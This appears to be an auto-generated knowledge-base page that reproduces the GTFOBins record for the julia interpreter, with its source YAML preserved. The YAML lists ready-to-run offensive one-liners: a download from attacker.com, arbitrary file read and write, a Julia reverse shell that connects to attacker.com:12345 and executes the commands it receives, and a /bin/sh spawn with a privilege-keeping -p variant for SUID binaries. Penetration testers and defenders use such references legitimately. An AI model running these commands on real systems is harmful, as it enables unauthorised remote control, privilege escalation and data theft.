---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# julia

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `julia` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [julia](../../tools/linux/julia.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | julia |
| name | julia |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/julia/ |

## Preserved Source Material

```yaml
_body: ''
_name: julia
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia
functions:
  download:
  - code: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: http-server
  file-read:
  - code: julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if
      !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe));
      write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    listener: tcp-server
  shell:
  - code: julia -e 'run(`/bin/sh`)'
    contexts:
      sudo: null
      suid:
        code: julia -e 'run(`/bin/sh -p`)'
        shell: false
      unprivileged: null
```
